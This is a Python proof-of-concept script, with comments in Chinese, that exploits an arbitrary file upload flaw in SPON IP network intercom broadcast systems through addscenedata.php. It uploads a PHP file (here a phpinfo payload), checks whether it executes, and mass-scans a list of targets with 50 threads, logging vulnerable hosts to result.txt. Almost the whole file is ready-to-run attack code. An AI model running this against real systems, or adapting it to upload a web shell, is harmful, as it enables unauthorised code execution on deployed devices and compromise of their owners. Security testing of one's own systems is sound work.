# 世邦通信 SPON IP网络对讲广播系统 addscenedata.php 任意文件上传漏洞
import argparse
from multiprocessing.dummy import Pool
import requests,json
import sys
requests.packages.urllib3.disable_warnings()
import time

#定义横幅


def banner():
    banner = """
██╗    ██╗ █████╗ ████████╗███████╗██████╗ ███╗   ███╗███████╗██╗      ██████╗ ███╗   ██╗
██║    ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██╔════╝██║     ██╔═══██╗████╗  ██║
██║ █╗ ██║███████║   ██║   █████╗  ██████╔╝██╔████╔██║█████╗  ██║     ██║   ██║██╔██╗ ██║
██║███╗██║██╔══██║   ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║     ██║   ██║██║╚██╗██║
╚███╔███╔╝██║  ██║   ██║   ███████╗██║  ██║██║ ╚═╝ ██║███████╗███████╗╚██████╔╝██║ ╚████║
 ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝                                                                                       
                                         author:watermelon_xz🍉
                  version:世邦通信 SPON IP网络对讲广播系统 addscenedata.php 任意文件上传漏洞
"""
    print(banner)


#定义主函数
def main():
    #调用横幅
    banner()
    #argparse模块处理命令行参数
    parser = argparse.ArgumentParser(description="世邦通信 SPON IP网络对讲广播系统 addscenedata.php 任意文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()
    #如果用户输入url而不是file时：
    if args.url and not args.file:
        poc(args.url)
        # if poc(args.url):
        #     exp(args.url)
    #如果用户输入file而不是url时：
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,mode='r',encoding='utf-8') as fr:
            for i in fr.readlines():
                url_list.append(i.strip().replace('\n',''))
                # print(url_list)    
                #设置多线程 
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    #如果用户输入的既不是url也不是file时：
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
             
#定义poc
def poc(target):
    payload = '/php/addscenedata.php'
    url = target+payload
    headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding':'gzip, deflate',
    'Content-Type':'multipart/form-data; boundary=b0b0dcc3da2dd47434dfbafd7be4c6d5965a5bf03b1e9affc7e72eea848b',
    'Accept-Encoding':'gzip, deflate, br',
    'Connection':'close',
    'Content-Length':'258', 
         }
    data = (
        '--b0b0dcc3da2dd47434dfbafd7be4c6d5965a5bf03b1e9affc7e72eea848b\r\n'
        'Content-Disposition:form-data; name="upload"; filename="test.php"\r\n'
        'Content-Type:application/octet-stream\r\n'
        '\r\n'
        '<?php phpinfo();?>\r\n'
        '--b0b0dcc3da2dd47434dfbafd7be4c6d5965a5bf03b1e9affc7e72eea848b--\r\n'
    )
   
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    payload1 = '/images/scene/test.php'
    url1 = target+payload1

    #请求网页
    try:
        re = requests.post(url=url,headers=headers,data=data,verify=False)
        # print(re.text)
        if re.status_code == 200 and '{"res":"1"}' in re.text:
            # print(f'[+++]该{target}存在世邦通信 SPON IP网络对讲广播系统 addscenedata.php 任意文件上传漏洞')
            re1= requests.get(url=url1)
            if re1.status_code==200 and 'alt="PHP logo"' in re1.text:
                print(re1.text)
                print(f'[+++]{target}存在任意文件上传漏洞,文件上传后地址为{url1}')
                with open('result.txt',mode='a',encoding='utf-8')as ft:
                    ft.write(target+'\n')
                return True 
        else:
            print(f'该{target}不存在该漏洞')
    except:
        print(f'该{target}存在问题，请手动测试')



if __name__ == '__main__':
    main()